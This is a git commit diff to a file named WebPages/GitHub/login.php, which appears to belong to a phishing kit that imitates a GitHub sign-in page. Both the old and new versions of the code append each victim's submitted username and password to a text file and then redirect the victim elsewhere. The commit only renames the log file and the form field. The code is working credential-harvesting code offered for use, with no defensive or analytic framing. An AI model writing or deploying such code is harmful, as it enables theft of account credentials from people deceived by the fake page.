b93eba24aaf446f25e1fae7ac08c4ba98662f8ba
malsman77 <55808541+malsman77@users.noreply.github.com>
2019-09-25 22:45:30 -0400

    Malsman77

--- WebPages/GitHub/login.php
+++ WebPages/GitHub/login.php
@@ -1,6 +1,6 @@
 <?php
 include 'ip.php';
 
-file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("k_noelle26.txt", "[EMAIL]: " . $_POST['k_noelle26'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: <CUSTOM>');
 exit();
